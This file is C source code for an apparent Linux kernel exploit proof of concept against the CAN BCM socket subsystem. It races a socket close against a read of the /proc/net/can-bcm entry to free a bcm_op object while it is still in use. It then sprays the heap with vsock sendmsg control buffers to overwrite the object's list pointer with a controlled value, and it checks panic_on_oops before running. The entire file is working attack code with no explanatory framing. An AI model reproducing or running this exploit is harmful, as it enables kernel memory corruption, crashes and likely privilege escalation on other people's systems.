#define _GNU_SOURCE        /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <linux/can/bcm.h>
#include <sys/syscall.h>

/* Runtime configuration */

#define RX_ALLOC 0
#define TX_ALLOC 1
#define CPU_TARGET 0
#define CPU_READ CPU_TARGET
#define CPU_SPARE 2

#define OBJ_SIZE 512

/* Definitions */

#define MAX_BCM_ID 1000
#define BCM_BUFFER 1024
#define DIRENT_SIZE 1024
#define BCM_ID_LENGTH 20
#define READ_THREADS 1
#define SPRAY_THREADS 35
#define IFINDEX 3
#define VSOCK_BUFFER 256
#define VSOCK_SEND_QUEUE_SIZE 1024
#define BUF_SIZE 1024
#define NEXT_POINTER_ADDR 0x4142434445464748
#define SOCKET_PORT 1234
#define SOCKET_LISTEN 100

#define MAIN_BARRIERS (READ_THREADS + SPRAY_THREADS + 2)   	// READ_THREADS + SPRAY_THREADS + MAIN + close()
#define SPRAY_BARRIERS (SPRAY_THREADS + 1) 			// SPRAY_THREADS + MAIN
#define SPRAY_BARRIERS_2 (SPRAY_THREADS + READ_THREADS) 	//SPRAY_THREADS + READ_THREADS
#define THREAD_BARRIERS 3
pthread_barrier_t barrier[THREAD_BARRIERS];

struct msg{
	struct bcm_msg_head msg_head;
	struct can_frame frame[1];
};

struct reallocation_object{
	unsigned long thread;
	unsigned long data;
	int vsock_sk_server;
	int vsock_sk_client;
};

struct list_head{
	unsigned long next;
	unsigned long prev;
} __attribute__((packed));

typedef unsigned char u8;
typedef unsigned int u32;
typedef long long s64;
typedef s64 ktime_t;

struct rb_node{
    unsigned long __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
};

struct timerqueue_node{
    struct rb_node node;
    ktime_t expires;
};

struct hrtimer{
    struct timerqueue_node node;
    ktime_t _softexpires;
    enum hrtimer_restart (*function)(struct hrtimer *);
    struct hrtimer_clock_base *base;
    u8 state;
    u8 is_rel;
    u8 is_soft;
    u8 is_hard;
    unsigned long rh_reserved1;
    unsigned long rh_reserved2;
};

struct bcm_op{
	struct list_head list;
	int ifindex;
	unsigned int can_id;
	unsigned int flags;
	unsigned long frames_abs;
	unsigned long frames_filtered;
	struct bcm_timeval ival1;
	struct bcm_timeval ival2;
	struct hrtimer timer;
	struct hrtimer thrtimer;
	ktime_t rx_stamp;
	ktime_t kt_ival1;
	ktime_t kt_ival2;
	ktime_t kt_lastmsg;
	int rx_ifindex;
	int cfsiz;
	u32 count;
	u32 nframes;
	u32 currframe;
	void *frames;
	void *last_frames;
	struct canfd_frame sframe;
	struct canfd_frame last_sframe;
	unsigned long *sk;
	unsigned long*rx_reg_dev;
};

struct bcm_op *bcm_op;

int can_sk;
int fd;
char files_found[MAX_BCM_ID][BCM_ID_LENGTH] = {{0}};

struct linux_dirent{
	unsigned long  d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};

unsigned int get_max_cpu_index(void){
	unsigned int max_cpu_index;

	if(CPU_TARGET > CPU_READ){

		max_cpu_index = CPU_TARGET;

	}else{

		max_cpu_index = CPU_READ;

	}

	if(max_cpu_index < CPU_SPARE){

		max_cpu_index = CPU_SPARE;

	}

return max_cpu_index;
}

int get_cpu(void){
        cpu_set_t cpuset;

        CPU_ZERO(&cpuset);

        if(sched_getaffinity(0, sizeof(cpuset), &cpuset) < 0){

                return -1; 

        }

        return CPU_COUNT(&cpuset);
}

int set_cpu(unsigned int cpu){
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	if(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0){

		return -1;

	}

return 0;
}

int create_can_bcm_socket(void){
	int fd;

	if((fd = socket(AF_CAN, SOCK_DGRAM, CAN_BCM)) < 0){

		return -1;

	}

	return fd;
}

char *register_bcm_entries(int detect){
        struct linux_dirent *dirent = NULL;
        char *file = NULL;
        char dirent_s[DIRENT_SIZE];
        char d_type;
        int fd;
        int fd_can_bcm;
        unsigned int j = 0; 
        unsigned int l = 0; 
        int i = 0; 
        int ret = 0; 

        memset(&dirent_s,'\0', sizeof(dirent_s));

        fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
        if(fd < 0){

                fd_can_bcm = create_can_bcm_socket();
                if(fd_can_bcm < 0){

                        return (void *)-1;

                }

                close(fd_can_bcm);

                fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
                if(fd < 0){

                        return (void *)-1;

                }    
        }    

        for(;;){

                if((ret = syscall(SYS_getdents, fd, &dirent_s, sizeof(dirent_s))) < 0){

                        close(fd);

                        return (void *)-1;

                }    

                if(ret == 0){

                        close(fd);

                        return NULL;

                }

                for(i = 0; i < ret;){

                        dirent = (struct linux_dirent *) (dirent_s + i);  

                        d_type = *(dirent_s + i + dirent->d_reclen - 1);  
    
                        if(d_type == DT_REG){

                                if(j >= MAX_BCM_ID){

					close(fd);

					return (void *)-1;

                                }

                                if(strlen(dirent->d_name) > BCM_ID_LENGTH){

					close(fd);

					return (void *)-1;

                                }

                                if(detect == 1){

                                        for(l = 0; l < MAX_BCM_ID; l++){

						if(strcmp(files_found[l], dirent->d_name) == 0){

							goto out;

                                                }
                                        }

                                        file = strdup(dirent->d_name);
                                        close(fd);

                                        return file;

                                }else{

                                        memcpy(&files_found[j], dirent->d_name, strlen(dirent->d_name));
                                        j++;

                                }
                        }

                        out:

                        i += dirent->d_reclen;
                }

        }

}

/* Close thread */

void *race01(void *a){
	long error;

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity race01 (close) thread\n");
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		return (void *)-1;
	}

	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE
		printf("[*] - Closing socket (race01)\n");
	#endif

	error = close(can_sk);

return (void *)error;
}

/* Read thread */

void *race02(void *a){
	char bcm_buffer[BCM_BUFFER];
	long error;

	memset(&bcm_buffer,'\0', sizeof(bcm_buffer));

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity race02 (close) thread\n");
	#endif

	if(set_cpu(CPU_READ) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		return (void *)-1;
	}

	pthread_barrier_wait(&barrier[0]);
	pthread_barrier_wait(&barrier[2]);

	#ifdef VERBOSE 
		printf("[*] - Reading /proc/net/can-bcm/entry (race02)\n");
	#endif

	error = read(fd, &bcm_buffer, sizeof(bcm_buffer));

return (void *)error;
}

/* Spray threads */

void *initialize_reallocation(void *_robj){
	struct reallocation_object *robj;
	struct sockaddr_vm sockaddr_vm;
	struct msghdr msghdr;
	struct iovec iovec;
	struct bcm_op *bcm_op;
	char payload[OBJ_SIZE];
	char buffer[VSOCK_BUFFER];
	long error;
	int thread;
	int sk_server, sk_client;
	int port;
	int i;

	robj = _robj;

	thread = robj->thread;
	port = SOCKET_PORT + thread;

	bcm_op = (struct bcm_op *)&payload;

	/* Initialize structures */

	memset(&sockaddr_vm, '\0', sizeof(sockaddr_vm));
	memset(&msghdr, '\0', sizeof(msghdr));
	memset(&iovec, '\0', sizeof(iovec));
	
	/* Initialize char buffer */

	memset(&payload, 'C', sizeof(payload));
	memset(&buffer, 'A', sizeof(buffer));

	#ifdef VERBOSE2
		printf("[*] - Overwriting next with %lx | Thread %d\n", robj->data, thread);
	#endif

	bcm_op->list.next = robj->data;
	bcm_op->list.prev = 0x5152535455565758;
	
	bcm_op->ifindex = 0x31323334;
	bcm_op->can_id = 0x35363738;
	bcm_op->flags = 0x21232425;

	#ifdef VERBOSE2
		printf("[*] - Creating server socket | Thread %d\n", thread);
	#endif

	sk_server = socket(AF_VSOCK, SOCK_STREAM, 0);
	if(sk_server < 0){

		return (void *)-1;

	}

	robj->vsock_sk_server = sk_server;

	#ifdef VERBOSE2
		printf("[*] - Creating client socket | Thread %d\n", thread);
	#endif

	sk_client = socket(AF_VSOCK, SOCK_STREAM, 0);
	if(sk_client < 0){

		return (void *)-1;

	}

	robj->vsock_sk_client = sk_client;

	sockaddr_vm.svm_family = AF_VSOCK;
	sockaddr_vm.svm_port = port;
	sockaddr_vm.svm_cid = VMADDR_CID_LOCAL;
	sockaddr_vm.svm_flags = 0;

	#ifdef VERBOSE2
		printf("[*] - Binding server socket port: %d | Thread %d\n", port, thread);
	#endif

	if(bind(sk_server, (struct sockaddr *)&sockaddr_vm, sizeof(sockaddr_vm)) < 0){

		return (void *)-1;

	}

	#ifdef VERBOSE2
		printf("[*] - Listening server socket | Thread %d\n", thread);
	#endif

	if(listen(sk_server, SOCKET_LISTEN) < 0){

		return (void *)-1;

	}

	sockaddr_vm.svm_family = AF_VSOCK;
	sockaddr_vm.svm_port = port;
	sockaddr_vm.svm_cid = VMADDR_CID_LOCAL;
	sockaddr_vm.svm_flags = 0;

	#ifdef VERBOSE2
		printf("[*] - Connecting to server port: %d | Thread %d\n", port, thread);
	#endif

	if(connect(sk_client, (struct sockaddr *)&sockaddr_vm, sizeof(struct sockaddr_vm)) < 0){

		return (void *)-1;

	}

	#ifdef VERBOSE2
		printf("[*] - Filling up buffer | Thread %d\n", thread);
	#endif

	for(i = 0; i < VSOCK_SEND_QUEUE_SIZE; i++){

		if(write(sk_client, buffer, sizeof(buffer)) < 0){

			return (void *)-1;

		}

	}

	iovec.iov_base = buffer;
	iovec.iov_len = sizeof(buffer);

	msghdr.msg_name = NULL;
	msghdr.msg_namelen = 0;
	msghdr.msg_iov = &iovec;
	msghdr.msg_iovlen = 1;
	msghdr.msg_control = payload;
	msghdr.msg_controllen = sizeof(payload);
	msghdr.msg_flags = 0;

	#ifdef VERBOSE2
		printf("[*] - Setting CPU affinity spray threads to CPU %d | Thread %d\n", CPU_TARGET, thread);
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		return (void *)-1;

	}

	pthread_barrier_wait(&barrier[1]);
	pthread_barrier_wait(&barrier[0]);

	usleep(1000);

	pthread_barrier_wait(&barrier[2]);

	#ifdef VERBOSE2
		printf("[*] - Reallocating... | Thread %d\n", thread);
	#endif

	if((error = sendmsg(sk_client, &msghdr, 0)) < 0){

		return (void *)-1;

	}

	close(sk_client);
	close(sk_server);
	
return (void *)error;
}

int initialize_barriers(void){

	if(pthread_barrier_init(&barrier[0], 0, MAIN_BARRIERS) < 0){

		return -1;

	}

	if(pthread_barrier_init(&barrier[1], 0, SPRAY_BARRIERS) < 0){

		return -1;

	}

	if(pthread_barrier_init(&barrier[2], 0, SPRAY_BARRIERS_2) < 0){

		return -1;

	}

return 0;
}

int check_panic_on_oops(void){
	char _state[2];
	int state;
	int fd;

	fd = open("/proc/sys/kernel/panic_on_oops", O_RDONLY);
	if(fd < 0){
		return -1;
	}

	if(read(fd, &_state, 1) < 0){

		close(fd);

		return -1;
	}

	_state[1] = '\0';

	close(fd);

	state = atoi(_state);

return state;
}

int main(void){
	pthread_t spray_threads[SPRAY_THREADS];
	pthread_t read_threads[READ_THREADS];
	pthread_t close_thread;
	struct reallocation_object robj[SPRAY_THREADS];
	struct sockaddr_can sockaddr_can;
	struct msg msg;
	char file_buffer[BUF_SIZE];
	char buffer[BUF_SIZE];
	char *can_bcm_entry;
	unsigned int max_cpu_index;
	int sk_vsock_accept;
	int retval = -1;
	int error = -EXIT_FAILURE;
	int ncpus;
	int i;

	/* Initialize structures */

	memset(&robj, '\0', sizeof(robj));
	memset(&sockaddr_can, '\0', sizeof(sockaddr_can));
	memset(&msg, '\0', sizeof(msg));

	/* Initialize char buffer */

	memset(&file_buffer, '\0', sizeof(file_buffer));
	memset(&buffer, '\0', sizeof(buffer));

	#ifdef VERBOSE
		printf("[*] - Disabling stdout buffering\n");
	#endif

	setbuf(stdout, NULL);

        #ifdef VERBOSE
                printf("[*] - Checking number of CPUs available\n");
        #endif

        ncpus = get_cpu();
	max_cpu_index = get_max_cpu_index();
        if(ncpus < (max_cpu_index + 1)){

                #ifdef VERBOSE
                        printf("[!] - Number of CPUs available below required\n");
                #endif

		exit(error);

        }

        #ifdef VERBOSE
                printf("[*] - CPUs available: %d\n", ncpus);
        #endif

	if(check_panic_on_oops()){

		#ifdef VERBOSE
			printf("[!] - panic_on_oops enabled\n");
		#endif

		exit(error);
	}
	
	#ifdef VERBOSE
		printf("[*] - Environment is safe to run\n");
		printf("[*] - Validating structures sizeof(struct bcm_op) == %ld\n", sizeof(struct bcm_op));
	#endif

	if((sizeof(struct bcm_op) < 472) || (sizeof(struct bcm_op) > 512)){

		#ifdef VERBOSE
			printf("[*] - Structure bcm_op has a different size than expected\n");
		#endif

		exit(error);
	}

	if(initialize_barriers() < 0){

		#ifdef VERBOSE
			printf("[!] - Error while initializing barriers\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread\n");
	#endif

	if(set_cpu(CPU_SPARE) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		exit(error);
	}

	can_sk = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);
	if(can_sk < 0 ){

		#ifdef VERBOSE
			printf("[!] - Error while creating a CAN BCM socket\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Socket created successfully\n");
	#endif

	sockaddr_can.can_ifindex = IFINDEX;
	
	if(connect(can_sk, (struct sockaddr *)&sockaddr_can, sizeof(sockaddr_can)) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while connecting to the CAN BCM socket\n");
		#endif

		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - Socket connected successfully\n");
	#endif

	can_bcm_entry = register_bcm_entries(1);
	if(can_bcm_entry == NULL){

		#ifdef VERBOSE
			printf("[!] - Error while detecting our CAN BCM entry\n");
		#endif

		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - CAN BCM entry: %s\n", can_bcm_entry);
	#endif

	snprintf(file_buffer, sizeof(file_buffer) - 1, "/proc/net/can-bcm/%s", can_bcm_entry);

	free(can_bcm_entry);
	can_bcm_entry = NULL;

	fd = open(file_buffer, O_RDONLY);
	if(fd < 0){

		#ifdef VERBOSE
			printf("[!] - Error while opening %s\n", file_buffer);
		#endif

		goto error_exit_1;
	}

	msg.msg_head.flags = 0;
	msg.msg_head.nframes = 1;
	msg.msg_head.count = 0;
	msg.msg_head.ival1.tv_sec = 0;
	msg.msg_head.ival1.tv_usec = 0;
	msg.msg_head.ival2.tv_sec = 0;
	msg.msg_head.ival2.tv_usec = 0;

	for(i = 0; i < RX_ALLOC; i++){

		msg.msg_head.opcode  = RX_SETUP;
		msg.msg_head.can_id  = i;

		if(write(can_sk, &msg, sizeof(msg)) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending message\n");
			#endif

			goto error_exit_2;
		}
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity main thread\n");
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	for(i = 0; i < TX_ALLOC; i++){

		msg.msg_head.opcode = TX_SETUP;
		msg.msg_head.can_id = i;

		if(write(can_sk, &msg, sizeof(msg)) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}

	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread CPU %d\n", CPU_SPARE);
	#endif

	if(set_cpu(CPU_SPARE) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Creating reallocation threads\n");
	#endif

	if(SPRAY_THREADS > 0){
		for(i = 0; i < SPRAY_THREADS; i++){

			robj[i].thread = i;
			robj[i].data = NEXT_POINTER_ADDR;

			if(pthread_create(&spray_threads[i], NULL, initialize_reallocation, (void *)&robj[i]) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while creating spray threads\n");
				#endif

				goto error_exit_2;
			}

		}

	}

	pthread_barrier_wait(&barrier[1]);

	#ifdef VERBOSE
		printf("[*] - Reallocation threads ready!\n");
		printf("[*] - Creating close thread\n");
	#endif

	if(pthread_create(&close_thread, NULL, &race01, NULL) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while creating close thread\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Creating read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_create(&read_threads[i], NULL, &race02, NULL) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while creating read threads\n");
				#endif

				goto error_exit_2;
			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - The race starts, releasing race barriers\n");
	#endif

	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE
		printf("[*] - Waiting...\n");
		printf("[*] - Finishing read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_join(read_threads[i], (void *)&retval) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while waiting for the read threads\n");
				#endif

			}else{
				if(retval != 0){

					#ifdef VERBOSE
						printf("[!] - Read thread %d returned error %d\n", i, retval);
					#endif

				}

			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - Finishing spray threads\n");
	#endif

	if(SPRAY_THREADS > 0){

		#ifdef VERBOSE
			printf("[*] - Waking up spray threads\n");
		#endif

		for(i = 0; i < SPRAY_THREADS; i++){

			sk_vsock_accept = accept(robj[i].vsock_sk_server, NULL, 0);
			if(sk_vsock_accept < 0){
				goto error_exit_2;
			}

			while(recv(sk_vsock_accept, &buffer, sizeof(buffer), MSG_DONTWAIT) > 0);

			close(sk_vsock_accept);
		}

		for(i = 0; i < SPRAY_THREADS; i++){
			if(pthread_join(spray_threads[i], (void *)&retval) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while waiting for the spray threads\n");
				#endif

			}else{
				if(retval != 0){

					#ifdef VERBOSE
						printf("[!] - Spray thread %d returned error %d\n", i, retval);
					#endif

				}

			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - Finishing close thread\n");
	#endif

	if(pthread_join(close_thread, (void *)&retval) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while waiting for the close thread\n");
		#endif

	}else{
		if(retval != 0){

			#ifdef VERBOSE
				printf("[!] - Close thread returned error %d\n", retval);
			#endif

		}

	}

	#ifdef VERBOSE
		printf("[*] - Exiting...\n");
	#endif

	error = EXIT_SUCCESS;

	error_exit_2:

		close(fd);

	error_exit_1:

		if(retval != 0){

			close(can_sk);

		}

return error;
}
